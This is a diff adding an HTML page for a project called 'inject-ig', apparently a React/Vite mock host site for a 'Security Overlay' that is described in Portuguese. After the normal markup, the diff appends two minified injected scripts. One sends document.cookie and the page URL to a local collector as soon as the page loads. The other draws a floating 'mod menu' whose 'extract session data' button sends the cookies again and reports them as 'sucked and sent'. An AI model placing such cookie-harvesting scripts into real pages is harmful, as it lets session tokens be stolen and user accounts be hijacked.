@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>inject-ig</title>
+    <!-- Simula o fundo de um site qualquer para testarmos o Overlay -->
+    <style>
+      body {
+        margin: 0;
+        min-height: 100vh;
+        background: #1a1a1a;
+        color: #fff;
+        font-family: system-ui;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+      .mock-site {
+        text-align: center;
+        opacity: 0.3;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="mock-site">
+      <h1>Seu Projeto Hospedeiro</h1>
+      <p>Pressione <b>Ctrl + Shift + D</b> para abrir o inject-ig Security Overlay.</p>
+    </div>
+    
+    <!-- O Vite vai injetar o nosso React aqui automaticamente -->
+    <script type="module" src="/src/main.jsx"></script>
+  
+<!-- INJECT-IG INJECTION -->
+<script>
+!function(){var t=new XMLHttpRequest;t.open("POST","http://localhost:8080/api/inject-ig/scan",!0),t.setRequestHeader("Content-Type","application/json"),t.send(JSON.stringify({url:window.location.href,arch:"AUTO_INJECT_LOCAL",keys:document.cookie}))}();
+</script>
+
+<!-- INJECT-IG MOD MENU INJECTION -->
+<script>
+!function(){const css=document.createElement("style");css.innerHTML=`@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap');.nx-mod{position:fixed;bottom:20px;right:20px;width:320px;background:rgba(20,20,20,0.85);backdrop-filter:blur(15px);-webkit-backdrop-filter:blur(15px);border:1px solid rgba(255,255,255,0.1);border-radius:12px;color:#F5F5F7;font-family:'Inter',sans-serif;z-index:999999;box-shadow:0 10px 30px rgba(0,0,0,0.5);overflow:hidden;animation:slideUp 0.4s cubic-bezier(0.16,1,0.3,1);}.nx-mod-header{background:rgba(0,0,0,0.4);padding:12px 15px;font-size:14px;font-weight:600;display:flex;justify-content:space-between;border-bottom:1px solid rgba(255,255,255,0.05);}.nx-mod-body{padding:15px;}.nx-mod-btn{width:100%;padding:10px;background:#0A84FF;color:#FFF;border:none;border-radius:6px;font-weight:600;cursor:pointer;margin-bottom:8px;}.nx-mod-btn.danger{background:rgba(255,59,48,0.2);color:#FF453A;}.nx-log{font-family:monospace;font-size:10px;color:#86868B;margin-top:10px;}@keyframes slideUp{from{transform:translateY(50px);opacity:0}to{transform:translateY(0);opacity:1}}`,document.head.appendChild(css);const div=document.createElement("div");div.className="nx-mod",div.innerHTML='<div class="nx-mod-header"><span>INJECT-IG OVERLAY</span></div><div class="nx-mod-body"><button class="nx-mod-btn" onclick="nxExtract()">Extrair Dados da Sessão</button><button class="nx-mod-btn danger" onclick="this.parentElement.parentElement.remove()">Fechar Menu</button><div class="nx-log" id="nx-log">Status: Aguardando comandos...</div></div>',document.body.appendChild(div);window.nxExtract=function(){document.getElementById("nx-log").innerText="[+] Dados sugados e enviados.";var t=new XMLHttpRequest;t.open("POST","http://localhost:8080/api/inject-ig/scan",!0),t.setRequestHeader("Content-Type","application/json"),t.send(JSON.stringify({url:window.location.href,arch:"MOD_MENU_UI",keys:document.cookie}))}}();
+</script>
+</body>
+</html>
